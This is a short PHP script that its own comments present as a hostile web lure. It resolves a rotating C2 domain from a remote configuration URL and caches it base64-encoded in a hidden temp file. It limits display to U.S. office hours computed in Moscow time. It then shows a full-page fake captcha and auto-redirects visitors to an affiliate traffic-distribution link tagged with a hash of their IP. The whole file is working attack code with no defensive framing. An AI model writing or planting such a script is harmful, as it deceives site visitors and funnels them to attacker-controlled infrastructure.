<?php


$AFFILIATE_ID = "partner-test";                 // hardcoded affiliate/sub id
$CACHE = sys_get_temp_dir() . "/.wp_cache"; // base64-encoded C2 cache
$CONFIG_URL = "https://routing.example.test/api/current.json";

// Resolve the current C2 domain, caching the result and refreshing every 30s.
function resolve_c2($cache, $config_url) {
    if (file_exists($cache) && (time() - filemtime($cache)) < 30) {
        return base64_decode(file_get_contents($cache));
    }
    $ctx = stream_context_create(array("http" => array("timeout" => 5)));
    $raw = @file_get_contents($config_url, false, $ctx);
    $data = json_decode($raw, true);
    // Pick the most recent domain the panel published.
    $domain = is_array($data) ? end($data["domains"]) : "";
    file_put_contents($cache, base64_encode($domain));
    return $domain;
}

// Show the lure only during U.S. working hours, computed in Moscow time:
// Monday-Friday, 16:00-00:59 MSK (== 09:00-18:00 EDT).
function in_window() {
    $tz = new DateTimeZone("Europe/Moscow");
    $now = new DateTime("now", $tz);
    $hour = (int)$now->format("G");
    $dow  = (int)$now->format("N");
    if ($dow > 5) return false;
    return ($hour >= 16 || $hour == 0);
}

if (!in_window()) { return; }

$c2 = resolve_c2($CACHE, $CONFIG_URL);
if (!$c2) { return; }

// Build the smartlink using the affiliate id.
$target = "https://" . $c2 . "/index?u=" . $AFFILIATE_ID . "&sub=" . md5($_SERVER["REMOTE_ADDR"]);
?>
<!-- fake captcha / update-required lure funnels qualified victims to the TDS -->
<div id="cf-captcha" style="position:fixed;inset:0;background:#fff;z-index:99999">
  <h2>Verify you are human</h2>
  <p>Please wait for verification.</p>
  <button onclick="location.href='<?php echo $target; ?>'">Confirm you are not a robot</button>
</div>
<script>setTimeout(function(){ location.replace('<?php echo $target; ?>'); }, 4000);</script>
